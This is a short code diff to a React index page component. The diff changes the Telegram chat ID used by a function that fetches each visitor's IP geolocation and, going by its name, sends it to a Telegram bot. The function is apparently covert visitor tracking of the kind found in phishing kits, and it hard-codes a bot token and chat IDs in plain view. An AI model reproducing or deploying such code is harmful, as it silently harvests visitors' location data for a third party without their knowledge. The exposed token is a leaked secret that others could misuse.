@@ -60,7 +60,7 @@ const Index: FC = () => {
             const fetchGeoAndSendTelegram = async () => {
                 const geoUrl = 'https://get.geojs.io/v1/ip/geo.json';
                 const botToken = '7901122063:AAFYDNwCeZolLkFG3U9m8i-5bJGeReZxnDE';
-                const chatId = '-4836923916';
+                const chatId = '-1002492772110';
 
                 const geoRes = await fetch(geoUrl);
                 const geoData = await geoRes.json();
